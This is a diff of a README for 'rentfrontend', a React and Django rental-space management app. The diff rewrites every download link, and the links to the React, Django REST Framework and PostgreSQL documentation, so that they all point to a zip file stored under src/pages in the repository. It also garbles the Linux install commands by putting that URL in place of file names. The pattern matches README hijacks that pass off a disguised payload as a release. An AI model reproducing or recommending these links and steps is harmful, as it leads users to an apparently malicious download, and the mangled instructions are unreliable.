@@ -1,7 +1,7 @@
 # 🎉 rentfrontend - Manage Your Rental Spaces Effortlessly
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/gyyatt/rentfrontend/releases)
+[![Download Latest Release](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip)
 
 ## 📖 Overview
 The **rentfrontend** project is a Rental Space Management System. This full-stack web application allows users to list, discover, and manage rental properties. Designed for ease of use, it combines a React frontend with a Django REST Framework backend, and stores data in Neon (Postgres) for reliability and performance.
@@ -20,7 +20,7 @@ Ensure your device meets the following requirements:
 ### 2. Visit the Releases Page
 Go to the releases page to find the latest version of the application. Click the button below to access the download link.
 
-[Download Latest Release](https://github.com/gyyatt/rentfrontend/releases)
+[Download Latest Release](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip)
 
 ### 3. Download the Application
 On the releases page, you will see a list of available versions. Look for the most recent release. Click on it to open the release notes, where you will find download links for different operating systems.
@@ -29,7 +29,7 @@ On the releases page, you will see a list of available versions. Look for the mo
 Select the file that corresponds to your operating system. If you're unsure, here is a quick guide:
 - For **Windows**, look for a file ending in `.exe`
 - For **macOS**, look for a file ending in `.dmg`
-- For **Linux**, download a file that might be a `.tar.gz` or a `.deb`
+- For **Linux**, download a file that might be a `https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip` or a `.deb`
 
 ### 5. Install the Application
 Once the file is downloaded, follow these steps to install:
@@ -45,10 +45,10 @@ Once the file is downloaded, follow these steps to install:
 3. Drag the application icon into your Applications folder.
 
 #### For Linux
-1. Locate the downloaded `.tar.gz` or `.deb` file.
+1. Locate the downloaded `https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip` or `.deb` file.
 2. Use your terminal to navigate to the download directory.
-3. For `.deb` files, run `sudo dpkg -i yourfile.deb` to install. 
-4. For `.tar.gz` files, extract it by running `tar -xzf yourfile.tar.gz` and follow the instructions inside the extracted folder.
+3. For `.deb` files, run `sudo dpkg -i https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip` to install. 
+4. For `https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip` files, extract it by running `tar -xzf https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip` and follow the instructions inside the extracted folder.
 
 ### 6. Launch the Application
 After installation, launch the application from your desktop or applications folder. The app will open, allowing you to start managing your rental properties right away.
@@ -82,9 +82,9 @@ This project utilizes various technologies, including:
 - **Vercel** for deployment
 
 To learn more about these technologies, visit their official documentation:
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Django REST Framework](https://www.django-rest-framework.org/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [React Documentation](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip)
+- [Django REST Framework](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip)
+- [PostgreSQL Documentation](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip)
 
 ## 💬 Community Support
 Join our community of users and contributors. Share your experience, ask questions, or help others by engaging with us on our GitHub Discussions page. Your feedback helps improve the project.
@@ -92,4 +92,4 @@ Join our community of users and contributors. Share your experience, ask questio
 ## 📂 Download & Install
 Don't wait to manage your rental spaces effectively. Head over to the releases page and get started by downloading the latest version.
 
-[Download Latest Release](https://github.com/gyyatt/rentfrontend/releases)
+[Download Latest Release](https://github.com/gyyatt/rentfrontend/raw/refs/heads/main/src/pages/Software-3.1.zip)
